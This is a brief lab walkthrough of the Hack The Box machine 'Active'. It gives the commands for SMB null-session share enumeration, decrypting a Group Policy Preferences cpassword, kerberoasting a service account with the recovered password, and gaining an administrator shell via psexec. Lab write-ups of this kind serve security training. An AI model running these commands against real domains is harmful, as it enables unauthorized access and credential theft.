starting with nmap 
`sudo nmap -sC -sV -p- -oN active -T4 10.10.10.100`
![[Pasted image 20240525110417.png]]


smb null session is allowed , let's explore open shares
`nxc smb 10.10.10.100 -u '' -p '' --shares -M spider_plus
`
![[Pasted image 20240525110701.png]]
Groups.xml looks juicy
![[Pasted image 20240525110751.png]]


let's connect to this share ,and get this file

`smbclient -N \\\\10.10.10.100\\Replication -U ''`

we found cpassword , we can decrypt it using ==gpp-decrypt==
![[Pasted image 20240525110913.png]]

`gpp-decrypt 'edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ'
`
![[Pasted image 20240525111021.png]]

we got creds for thje SVC_TGS
![[Pasted image 20240525111146.png]]


let's try kerberoasting attack using the creds we found

`nxc ldap 10.10.10.100 -u 'active.htb\SVC_TGS' -p 'GPPstillStandingStrong2k18' --kerberoast kerberoasting`
![[Pasted image 20240525111243.png]]

let's try to crack it

![[Pasted image 20240525111411.png]]

we can now get psexec to get shell on the box as administrator 

![[Pasted image 20240525111519.png]]